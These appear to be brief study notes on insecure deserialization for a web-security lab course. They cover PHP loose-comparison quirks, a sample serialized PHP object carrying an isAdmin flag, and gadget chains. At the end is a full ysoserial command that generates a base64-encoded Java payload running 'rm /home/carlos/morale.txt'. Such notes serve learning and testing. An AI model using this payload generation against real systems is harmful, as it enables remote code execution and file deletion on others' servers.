# PHP

**v7 and earlier**:
`0 == 'whaterver'`
evalutes to true

*including 8 version*:
`5 == '5 whatever';`

Serialized object example:
`O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`

# Gadget chains
A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. 

### Working with pre-built gadget chains

#### ysoserial - tool for payload creation for java deserialization
https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
Example of usage on java 21:
```bash
java \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   -jar ./ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
Creates malicious serialized data